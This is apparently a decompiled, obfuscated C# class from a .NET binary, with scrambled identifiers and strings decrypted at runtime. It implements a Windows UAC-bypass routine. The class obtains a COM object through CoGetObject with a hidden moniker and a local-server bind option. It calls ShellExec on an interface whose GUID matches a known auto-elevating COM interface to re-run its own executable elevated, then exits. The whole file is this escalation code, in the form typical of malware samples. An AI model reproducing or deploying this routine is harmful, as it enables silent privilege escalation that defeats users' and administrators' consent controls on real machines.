using System;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace wmzoZRdMaf;

internal sealed class ddxTokUTHjtkR
{
	internal enum CcjIANpmZi : long
	{
		xNcadQDfdPk = 1L,
		vkgqhGoaYuVN = 0L,
		NQSoslDbBFg = 2147942487L,
		etsobOFhWrZjPFY = 2147942414L
	}

	internal struct NLZMwspgXZZwt
	{
		internal uint XNWlyXHYDIjoa;

		internal uint BxwpveVPZVF;

		internal uint qNGSdcxXPkXZrs;

		internal uint gnTKdtEzFfyCX;

		internal uint nVbmHWkJsnZp;

		internal uint NIPMeHdgLYQC;

		internal uint AcbrJuCZhP;

		private object NawTJxfLHcPu;

		internal IntPtr VSsdIRxtTnnu;
	}

	[ComImport]
	[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
	[Guid("6EDD6D74-C007-4E75-B76A-E5740995E24C")]
	private interface fbbZpinMqXVJ
	{
		[MethodImpl(MethodImplOptions.PreserveSig | MethodImplOptions.InternalCall)]
		void Method1();

		[MethodImpl(MethodImplOptions.PreserveSig | MethodImplOptions.InternalCall)]
		void Method2();

		[MethodImpl(MethodImplOptions.PreserveSig | MethodImplOptions.InternalCall)]
		void Method3();

		[MethodImpl(MethodImplOptions.PreserveSig | MethodImplOptions.InternalCall)]
		void Method4();

		[MethodImpl(MethodImplOptions.PreserveSig | MethodImplOptions.InternalCall)]
		void Method5();

		[MethodImpl(MethodImplOptions.PreserveSig | MethodImplOptions.InternalCall)]
		void Method6();

		[MethodImpl(MethodImplOptions.PreserveSig | MethodImplOptions.InternalCall)]
		CcjIANpmZi ShellExec([In][MarshalAs(UnmanagedType.LPWStr)] string file, [In][MarshalAs(UnmanagedType.LPWStr)] string paramaters, [In][MarshalAs(UnmanagedType.LPWStr)] string directory, [In] ulong fMask, [In] ulong nShow);
	}

	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("ole32.dll", CharSet = CharSet.Unicode, ExactSpelling = true, PreserveSig = false)]
	[return: MarshalAs(UnmanagedType.Interface)]
	internal static extern object CoGetObject(string NefkLXEJofpLt, [In] ref NLZMwspgXZZwt aTgxVrbjsoMX, [In][MarshalAs(UnmanagedType.LPStruct)] Guid MjyTcEIGLv);

	public static object HZUVggrRlhK(Guid guid_0, Guid guid_1)
	{
		string text = guid_0.ToString(getString_0(107401691));
		string nefkLXEJofpLt = IuKjJmfJcVBFA.dOioDTBjWKE(getString_0(107401686)) + text;
		NLZMwspgXZZwt aTgxVrbjsoMX = default(NLZMwspgXZZwt);
		aTgxVrbjsoMX.XNWlyXHYDIjoa = (uint)Marshal.SizeOf(aTgxVrbjsoMX);
		aTgxVrbjsoMX.VSsdIRxtTnnu = IntPtr.Zero;
		aTgxVrbjsoMX.NIPMeHdgLYQC = 4u;
		return CoGetObject(nefkLXEJofpLt, ref aTgxVrbjsoMX, guid_1);
	}

	public static void ihuckvjbrNv()
	{
		Guid guid_ = new Guid(IuKjJmfJcVBFA.dOioDTBjWKE(getString_0(107401629)));
		Guid guid_2 = new Guid(IuKjJmfJcVBFA.dOioDTBjWKE(getString_0(107401564)));
		fbbZpinMqXVJ fbbZpinMqXVJ = (fbbZpinMqXVJ)HZUVggrRlhK(guid_, guid_2);
		fbbZpinMqXVJ.ShellExec(Assembly.GetEntryAssembly()!.Location, null, null, 0uL, 5uL);
		Marshal.ReleaseComObject(fbbZpinMqXVJ);
		Environment.Exit(0);
	}

	static ddxTokUTHjtkR()
	{
		Strings.CreateGetStringDelegate(typeof(ddxTokUTHjtkR));
	}
}
